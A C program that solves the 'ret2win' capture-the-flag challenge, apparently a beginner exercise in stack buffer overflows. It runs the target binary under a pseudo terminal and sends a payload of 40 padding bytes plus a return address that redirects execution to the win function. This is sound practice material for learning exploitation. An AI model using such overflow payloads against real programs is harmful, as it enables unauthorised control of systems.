/* 
 * Exploit the ret2win challenge
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <pty.h>
#include <fcntl.h>

int master;

void handle(int signum) {
    char buffer[1024];
    read(master, buffer, sizeof(buffer));
    printf("\nHandler Output:\n%s", buffer);
}

int main(void) {
    // disable buffering for stdout
    setbuf(stdout, NULL);

    // define signal handler
    struct sigaction sigchld_action = { .sa_handler = handle, .sa_flags = SA_NOCLDWAIT };
    sigaction(SIGCHLD, &sigchld_action, NULL);

    // create a new process and connect it to a pseudo terminal
    // this forces the target process to flush on newlines and we don't loose it because of "abort"
    pid_t pid = forkpty(&master, NULL, NULL, NULL);
    if(pid==-1) exit(1);

    // disable some terminal behaviour like echo input and behaviour of special characters ~(ECHO | ECHONL | ISIG);
    struct termios tios;
    tcgetattr(master, &tios);
    tios.c_lflag = 0; // disable all options
    tcsetattr(master, TCSANOW, &tios);

    if(!pid) {
        // the child: execute ret2win
        char *argv[]={ "./ret2win", 0};
        execv(argv[0], argv);
    } else {
        // the parent: send the buffer overflow payload

        // ret after 40 chars
        char input[49];
        for(int i = 0; i < 40; i++) {
            input[i] = 'A';
        }
        // ret to sym.ret2win == 0x00400811
        // 64 bit so must be 8 bytes wide
        input[40] = '\x11';
        input[41] = '\x08';
        input[42] = '\x40';
        input[43] = '\x00';
        input[44] = '\x00';
        input[45] = '\x00';
        input[46] = '\x00';
        input[47] = '\x00';
        input[48] = '\n';

        // read initial input
        char temp = '0';
        // probably better to use a buffer and read all into buffer instead of single chars
        // then again probably not, declare a function to do a strncmp etc...
        for(;;) {
            if (temp == '>') {
                read(master, &temp, sizeof(temp)); /* extra space */
                break;
            }
            read(master, &temp, sizeof(temp));
            printf("%c", temp);
        }

        // write the buffer overflow payload to the pseudo terminal
        write(master, input, sizeof(input));
        /* i think exploit does not return flag due to !sighandler */
        //write(master, "sup\n", sizeof("sup\n"));

        char buffer[1024];
        for(int i = 0; i < 1024; i++) {
            buffer[i] = 0;
        }
        read(master, buffer, sizeof(buffer));
        printf("\nOutput:\n%s", buffer);

        // close the opened pseudo terminal
        close(master);
    }
}